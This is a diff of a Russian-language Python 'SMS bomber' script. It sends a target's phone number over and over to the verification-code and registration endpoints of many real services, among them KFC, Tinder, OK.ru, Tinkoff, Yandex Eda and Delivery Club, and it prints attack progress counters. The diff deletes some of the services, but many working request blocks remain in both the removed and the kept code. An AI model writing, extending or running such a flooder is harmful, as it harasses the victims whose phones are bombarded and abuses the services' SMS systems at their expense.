             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://fix-price.ru/ajax/register_phone_code.php',
-                          data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
-            R = R + 1
-            print('[+] Fix-Price отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://www.nl.ua', data={"component": "bxmaker.authuserphone.login",
                                                      "sessid": "bf70db951f54b837748f69b75a61deb4", "method": "sendCode",
                                                      "phone": _phone, "registration": "N", })
@@ -9992,17 +9024,6 @@ if call == str(2):
                           json={"mobile": "+" + _phone, "action": "confirm_mobile"})
             R = R + 1
             print('[+] Smart.Space отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
-            R = R + 1
-            print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] не отправлено!')
@@ -10283,31 +9304,9 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] error in sent!')
@@ -10459,18 +9458,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                          data={"st.r.phone": "+" + _phone})
-            R = R + 1
-            print('[+] OK отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
             R = R + 1
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
@@ -10499,17 +9486,6 @@ if call == str(2):
             R = R + 1
             print('[+] SMSgorod отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone})
-            R = R + 1
-            print('[+] Tinder отправлено! || Кол-во - ' + str(R))
         except:
             print('[-] error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -10826,31 +9802,9 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] error in sent!')
@@ -11006,18 +9960,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                          data={"st.r.phone": "+" + _phone})
-            R = R + 1
-            print('[+] OK отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
             R = R + 1
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
@@ -11053,35 +9995,11 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone})
-            R = R + 1
-            print('[+] Tinder отправлено! || Кол-во - ' + str(R))
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
             R = R + 1
             print('[+] BelkaCar отправлено|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone}, headers={})
-            R = R + 1
-            print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -11283,31 +10201,9 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
 
@@ -11455,30 +10351,6 @@ if call == str(2):
             print('[+] MVideo отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                          data={"st.r.phone": "+" + _phone})
-            R = R + 1
-            print('[+] OK отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://plink.tech/register/', json={"phone": _phone})
-            R = R + 1
-            print('[+] Plink отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -11489,7 +10361,6 @@ if call == str(2):
             print('[+] qlean отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -11500,19 +10371,6 @@ if call == str(2):
             print('[+] SMSgorod отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone})
-            R = R + 1
-            print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -11526,7 +10384,6 @@ if call == str(2):
             print('[+] Twitch отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -11542,19 +10399,16 @@ if call == str(2):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
-
         try:
             requests.post("https://api.wowworks.ru/v2/site/send-code", json={"phone": _phone, "type": 2})
             R = R + 1
             print('[+] wowworks отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
-
         try:
             requests.post('https://eda.yandex/api/v1/user/request_authentication_code',
                           json={"phone_number": "+" + _phone})
@@ -11562,7 +10416,6 @@ if call == str(2):
             print('[+] Eda.Yandex отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -11578,7 +10431,6 @@ if call == str(2):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
-
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
                           json={"client_type": "personal", "email": f"{email}@gmail.ru", "mobile_phone": _phone,
@@ -11587,7 +10439,6 @@ if call == str(2):
             print('[+] Alpari отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -11694,27 +10545,6 @@ if call == str(2):
             time.sleep(0.1)
         except:
             print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-
-            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
-            R = R + 1
-            print('[+] Delivery отправлено! || Кол-во - ' + str(R))
-            print('Возникли вопросы ? Пишите разработчику в ВК [ --> Иван Зайцев <-- ]')
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        try:
-            requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register',
-                          data={'phoneNumber': _phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com',
-                                'deviceToken': '*'}, headers={
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
-            print('[+] Grab отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
@@ -11789,18 +10619,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone}, headers={})
-            R = R + 1
-            print('[+] Tinder отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
             R = R + 1
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
@@ -11812,7 +10630,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-
             requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
             R = R + 1
             print('[+] Tinkoff отправлено! || Кол-во - ' + str(R))
@@ -11824,7 +10641,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-
             requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
             R = R + 1
             print('[+] Dostavista отправлено! || Кол-во - ' + str(R))
@@ -11888,19 +10704,6 @@ if call == str(2):
             requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
             R = R + 1
             print('[+] KoronaPay отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://silpo.ua/graphql', data={
-                "validateLoginInput": {"flowId": 99322, "currentPlace": "_phone", "nextStep": "auth-otp",
-                                       "__typename": "FlowResponse"}})
-            R = R + 1
-            print('[+] Silpo отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] не отправлено!')
@@ -12172,18 +10975,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://fix-price.ru/ajax/register_phone_code.php',
-                          data={"register_call": "Y", "action": "getCode", "phone": "+" + _phone})
-            R = R + 1
-            print('[+] Fix-Price отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://www.nl.ua',
                           data={"component": "bxmaker.authuserphone.login",
                                 "sessid": "bf70db951f54b837748f69b75a61deb4",
@@ -12295,17 +11086,6 @@ if call == str(2):
                           json={"mobile": "+" + _phone, "action": "confirm_mobile"})
             R = R + 1
             print('[+] Smart.Space отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] не отправлено!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={"phone": "+" + _phone})
-            R = R + 1
-            print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] не отправлено!')
@@ -12587,31 +11367,9 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] error in sent!')
@@ -12763,18 +11521,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                          data={"st.r.phone": "+" + _phone})
-            R = R + 1
-            print('[+] OK отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
             R = R + 1
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
@@ -12803,17 +11549,6 @@ if call == str(2):
             R = R + 1
             print('[+] SMSgorod отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone})
-            R = R + 1
-            print('[+] Tinder отправлено! || Кол-во - ' + str(R))
         except:
             print('[-] error in sent!')
         if time.time() > start_time + float(CLOSE_AFTER):
@@ -13131,31 +11866,9 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(0.1)
         except:
             print('[-] error in sent!')
@@ -13311,18 +12024,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                          data={"st.r.phone": "+" + _phone})
-            R = R + 1
-            print('[+] OK отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
             R = R + 1
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
@@ -13358,17 +12059,6 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone})
-            R = R + 1
-            print('[+] Tinder отправлено! || Кол-во - ' + str(R))
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
             R = R + 1
             print('[+] RuTaxi отправлено!|| Кол-во - ' + str(R))
@@ -13378,19 +12068,6 @@ if call == str(2):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone}, headers={})
-            R = R + 1
-            print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -13412,7 +12089,6 @@ if call == str(2):
             print('[+] Tinkoff отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -13592,31 +12268,9 @@ if call == str(2):
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
             break
         try:
-            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
-            R = R + 1
-            print('[+] Beltelcom отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
-            R = R + 1
-            print('[+] KFC отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
 
@@ -13727,7 +12381,6 @@ if call == str(2):
             print('[+] IVI отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -13739,7 +12392,6 @@ if call == str(2):
             print('[+] Lenta отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -13751,7 +12403,6 @@ if call == str(2):
             print('[+] Mail.ru отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -13764,30 +12415,6 @@ if call == str(2):
             print('[+] MVideo отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
-                          data={"st.r.phone": "+" + _phone})
-            R = R + 1
-            print('[+] OK отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://plink.tech/register/', json={"phone": _phone})
-            R = R + 1
-            print('[+] Plink отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -13809,19 +12436,6 @@ if call == str(2):
             print('[+] SMSgorod отправлено!|| Кол-во - ' + str(R))
         except:
             print('[-] Не отправлено!')
-
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
-                          data={'phone_number': _phone})
-            R = R + 1
-            print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
-        except:
-            print('[-] Не отправлено!')
-
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
             print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
@@ -14000,19 +12614,6 @@ if call == str(2):
             requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode", data={"phone": _phone})
             R = R + 1
             print('[+] SMS отправлено! || Кол-во - ' + str(R))
-            time.sleep(0.1)
-        except:
-            print('[-] error in sent!')
-        if time.time() > start_time + float(CLOSE_AFTER):
-            print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
-            break
-        try:
-
-            requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
-            R = R + 1
-            print('[+] Delivery отправлено! || Кол-во - ' + str(R))
-            print('Возникли вопросы ? Пишите разработчику в ВК [ --> Иван Зайцев <-- ]')
             time.sleep(0.1)
         except:
             print('[-] error in sent!')
